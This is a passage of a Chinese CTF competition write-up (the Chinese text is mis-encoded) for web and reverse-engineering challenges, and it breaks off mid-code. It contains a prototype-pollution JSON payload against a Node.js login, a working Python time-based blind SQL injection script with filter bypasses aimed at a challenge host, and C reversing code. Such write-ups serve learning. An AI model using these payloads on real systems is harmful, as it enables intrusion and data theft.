src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-231749364.png" class="">  <p>æ ¹æ®hintå¯ä»¥çŒœå‡ºï¼Œå…¶è´¦å·å¯†ç ä¸ºStarven/123456<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-231841150.png" class=""><br>å¾—åˆ°æºç <br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; merge &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./utils/common.js&#x27;</span>); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">handleLogin</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> geeker = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">geekerData</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">username</span> = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">password</span> = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    </span><br><span class="line">        <span class="title function_">merge</span>(geeker, req.<span class="property">body</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(geeker.<span class="property">geekerData</span>.<span class="property">username</span> == <span class="string">&#x27;Starven&#x27;</span> &amp;&amp; geeker.<span class="property">geekerData</span>.<span class="property">password</span> == <span class="string">&#x27;123456&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(geeker.<span class="property">hasFlag</span>)&#123;</span><br><span class="line">                <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;direct.html&#x27;</span>);</span><br><span class="line">                res.<span class="title function_">sendFile</span>(filePath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">                        res.<span class="title function_">status</span>(err.<span class="property">status</span>).<span class="title function_">end</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;error.html&#x27;</span>);</span><br><span class="line">                res.<span class="title function_">sendFile</span>(filePath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">                        res.<span class="title function_">status</span>(err.<span class="property">status</span>).<span class="title function_">end</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;error2.html&#x27;</span>); </span><br><span class="line">            res.<span class="title function_">sendFile</span>(filePath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">                    res.<span class="title function_">status</span>(err.<span class="property">status</span>).<span class="title function_">end</span>(); </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">object1, object2</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">            <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">                <span class="title function_">merge</span>(object1[key], object2[key]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                object1[key] = object2[key];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">module</span>.<span class="property">exports</span> = &#123; merge &#125;;</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241101-214600242.png" class=""><br>çœ‹ä»£ç å¯ä»¥çŸ¥é“å…¶å¯ä»¥åŸå‹é“¾æ±¡æŸ“ï¼Œæˆ‘ä»¬åªè¦æ±¡æŸ“hasFlagçš„åŸå‹ä½¿å…¶æœ‰å€¼å³å¯<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;Starven&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;hasFlag&quot;:&quot;1&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-232356317.png" class="">  </p><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-232424074.png" class="">  <p>å¥—å¨ƒï¼Œç©å‘¢?<br>å…¶è¯´å’Œå‰é¢ä¸€æ ·ï¼Œé‚£ä¹ˆå…¶åç«¯åº”è¯¥è¿˜æ˜¯è§£æjsonï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•ä¼ jsonè¿›å»è¿™ä½¿ç”¨å°±è¦ç”¨å¦‚ä¸‹æ–¹æ³•æ¥ä¼ å€¼ï¼Œjsä¼šå°†ä¸‹é¢çš„ä¼ çš„å€¼è¿›è¡Œæ‹¼æ¥ï¼Œæœ€ç»ˆå†jsonè§£ææ—¶ä»ç„¶å¯ä»¥è¢«æ­£å¸¸è§£æ<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241101-214437585.png" class="">  </p><h2 id="funnySQL"><a href="#funnySQL" class="headerlink" title="funnySQL"></a>funnySQL</h2><p>æ³¨å…¥æ— å›æ˜¾ï¼Œä¸”è¿‡æ»¤äº†sleepæˆ‘ä»¬å¯ä»¥ä½¿ç”¨BENCHMARK(10000000,sha(1))æ¥è¿›è¡Œç»•è¿‡ç©ºæ ¼ç”¨%OBä¸”è¿‡æ»¤äº†andå’Œorä½¿ç”¨&amp;&amp;æ¥ä»£æ›¿andã€‚ä¸”å› ä¸ºorè¢«è¿‡æ»¤æˆ‘ä»¬éœ€è¦æ˜¯æ— åˆ—åæ³¨å…¥ï¼Œä¸”ç­‰å·ç»™è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨RLIKE BINARYæ¥ä»£æ›¿ï¼Œä¹‹æ‰€ä»¥ä¸ç”¨likeæ˜¯å› ä¸ºå…¶ä¸åˆ†å¤§å°å†™ï¼Œè¿™ä¼šå¯¼è‡´å…¶å¾—åˆ°çš„ç»“æœå¯èƒ½å‡ºç°åå·®(å¤§æ¦‚ï¼Œç†è®ºä¸Šæ˜¯è¿™æ ·çš„ï¼Œä½†æ˜¯å®æµ‹ä¸‹æ¥å‘ç°å…¶å®ç”¨likeé—®é¢˜å¥½åƒä¹Ÿä¸å¤§)<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-200112313.png" class="">  </p><p>å‰©ä¸‹çš„å…¶å®å°±æ˜¯ç›²æ³¨åŠ æ— åˆ—åæ³¨å…¥äº†<br>expå¦‚ä¸‹<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://80-8f8f8fb9-06cc-4f43-ae84-73b883155c4b.challenge.ctfplus.cn/&quot;</span></span><br><span class="line">params = &#123;<span class="string">&quot;action&quot;</span>: <span class="string">&quot;check&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">dic = <span class="string">&quot;ZXCVBNMLKJHGFDSAQWERTYUIOPabcdefghijklmnopqrstuvwxyz1234567890_&#123;&#125;,-&quot;</span></span><br><span class="line">flag= <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(dic)):</span><br><span class="line">        char=dic[j]</span><br><span class="line">        payload = <span class="string">&quot;username=1&#x27;%26%26if(substr((select%0Bgroup_concat(table_name)%0Bfrom%0Bmysql.innodb_table_stats),&#123;&#125;,1)RLIKE%0BBINARY%0B&#x27;&#123;&#125;&#x27;,BENCHMARK(10000000,sha(1)),BENCHMARK(0,sha(1)))%23&quot;</span> .<span class="built_in">format</span>(i,char)</span><br><span class="line">        <span class="comment">#payload=&quot;username=1&#x27;%26%26if(substr((select%0B`1`%0Bfrom(select%0B1%0Bunion%0Bselect%0B*%0Bfrom%0BRea11ys3ccccccr3333t)x%0Blimit%0B1,1),&#123;&#125;,1)RLIKE%0BBINARY%0B&#x27;&#123;&#125;&#x27;,BENCHMARK(14000000,sha(1)),BENCHMARK(1,sha(1)))%23&quot; .format(i,char)</span></span><br><span class="line">        <span class="comment">#payload = &quot;username=1&#x27;%26%26if(substr((select%0Bgroup_concat(table_name)%0Bfrom%0Bsys.schema_auto_increment_columns%0Bwhere%0Btable_schema=database()),&#123;&#125;,1)like%0B&#x27;&#123;&#125;&#x27;,BENCHMARK(3000000,sha(1)),BENCHMARK(0,sha(1)))%23&quot; .format(i,char)</span></span><br><span class="line"></span><br><span class="line">        sql_url=url+<span class="string">&quot;?&quot;</span>+payload</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(sql_url,verify=<span class="literal">False</span>)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        <span class="built_in">print</span>(end_time - start_time)</span><br><span class="line">        <span class="keyword">if</span> end_time - start_time &gt; <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(end_time - start_time)</span><br><span class="line">            flag += char</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><br>å¯ä»¥çˆ†ç ´å‡ºè¡¨é¢å¦‚ä¸‹<br>gtid_slave_pos,Rea11ys3ccccccr3333t,users<br>è€Œflagåœ¨Rea11ys3ccccccr3333tå†…<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241112-190718786.png" class="">  </p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="ä¹Ÿè®¸ä½ ä¹Ÿå¬jay"><a href="#ä¹Ÿè®¸ä½ ä¹Ÿå¬jay" class="headerlink" title="ä¹Ÿè®¸ä½ ä¹Ÿå¬jay"></a>ä¹Ÿè®¸ä½ ä¹Ÿå¬jay</h2><p>æ‰“å¼€é™„ä»¶æ˜¯.cä»£ç <br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-001354891.png" class=""><br>å…ˆæŠŠå˜é‡åæ¢ä¸€ä¸‹<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   </span><br><span class="line">    <span class="type">char</span> URL[<span class="number">46</span>];</span><br><span class="line">    <span class="type">char</span> aaaa[<span class="number">46</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(aaaa, URL);</span><br><span class="line">    <span class="type">char</span> bbb[] = &#123;<span class="number">0x96</span>, <span class="number">0xa1</span>, <span class="number">0xa0</span>, <span class="number">0x9b</span>, <span class="number">0x9b</span>, <span class="number">0x5f</span>, <span class="number">0x49</span>, <span class="number">0x46</span>, <span class="number">0x85</span>, <span class="number">0x82</span>, <span class="number">0x53</span>, <span class="number">0x95</span>, <span class="number">0x7d</span>, <span class="number">0x36</span>, <span class="number">0x8d</span>, <span class="number">0x74</span>, <span class="number">0x82</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0x7a</span>, <span class="number">0x81</span>, <span class="number">0x65</span>, <span class="number">0x80</span>, <span class="number">0x6c</span>, <span class="number">0x78</span>, <span class="number">0x2f</span>, <span class="number">0x6b</span>, <span class="number">0x6a</span>, <span class="number">0x27</span>, <span class="number">0x50</span>, <span class="number">0x61</span>, <span class="number">0x38</span>, <span class="number">0x3f</span>, <span class="number">0x37</span>, <span class="number">0x33</span>, <span class="number">0xf1</span>, <span class="number">0x27</span>, <span class="number">0x32</span>, <span class="number">0x34</span>, <span class="number">0x1f</span>, <span class="number">0x39</span>, <span class="number">0x23</span>, <span class="number">0xde</span>, <span class="number">0x1c</span>, <span class="number">0x17</span>, <span class="number">0xd4</span>&#125;;</span><br><span class="line">    <span class="type">int</span>  ccc[] = &#123;<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span>, <span class="number">0x2E</span>, <span class="number">0x2F</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3A</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0x3E</span>, <span class="number">0x3F</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x4A</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x4F</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0x5A</span>, <span class="number">0x5B</span>, <span class="number">0x5C</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x5F</span>, <span class="number">0x60</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x6D</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x70</span>, <span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x7A</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>, <span class="number">0x7D</span>, <span class="number">0x7E</span>, <span class="number">0x7F</span>, <span class="number">0x80</span>, <span class="number">0x81</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x84</span>, <span class="number">0x85</span>, <span class="number">0x86</span>, <span class="number">0x87</span>, <span class="number">0x88</span>, <span class="number">0x89</span>, <span class="number">0x8A</span>, <span class="number">0x8B</span>, <span class="number">0x8C</span>, <span class="number">0x8D</span>&#125;;</span><br><span class="line">    <span class="type">int</span>  dddd[] = &#123;<span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>, <span class="number">0x2E</span>, <span class="number">0x2D</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>, <span class="number">0x2A</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x27</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x22</span>, <span class="number">0x21</span>, <span class="number">0x20</span>, <span class="number">0x1F</span>, <span class="number">0x1E</span>, <span class="number">0x1D</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x1A</span>, <span class="number">0x19</span>, <span class="number">0x18</span>, <span class="number">0x17</span>, <span class="number">0x16</span>, <span class="number">0x15</span>, <span class="number">0x14</span>, <span class="number">0x13</span>, <span class="number">0x12</span>, <span class="number">0x11</span>, <span class="number">0x10</span>, <span class="number">0x0F</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x01</span>&#125;;</span><br><span class="line">    <span class="type">int</span> eeee[]=&#123;<span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x63</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x60</span>, <span class="number">0x5F</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(URL);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        eeee[i] ^=  dddd[i+<span class="number">1</span>];  </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        aaaa[i] ^=  ccc[i];  </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        eeee[i] -=  ccc[i];  </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            aaaa[i] -=  ccc[<span class="number">47</span> + i];  </span><br><span class="line">             ccc[i]^=eeee[<span class="number">51</span>];</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        aaaa[i] +=  dddd[i];  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(aaaa[i] != bbb[i])&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>ç„¶åçœ‹ä¸€ä¸‹é€»è¾‘å¯ä»¥çŸ¥é“<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-130039021.png" class="">  </p><p>åŠ å¯†çš„æœ€ç»ˆç»“æœå°±æ˜¯bbbé‚£ä¹ˆæˆ‘ä»¬åªè¦é€†å›å»å³å¯<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>  dddd[] = &#123;<span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>, <span class="number">0x2E</span>, <span class="number">0x2D</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>, <span class="number">0x2A</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x27</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x22</span>, <span class="number">0x21</span>, <span class="number">0x20</span>, <span class="number">0x1F</span>, <span class="number">0x1E</span>, <span class="number">0x1D</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span 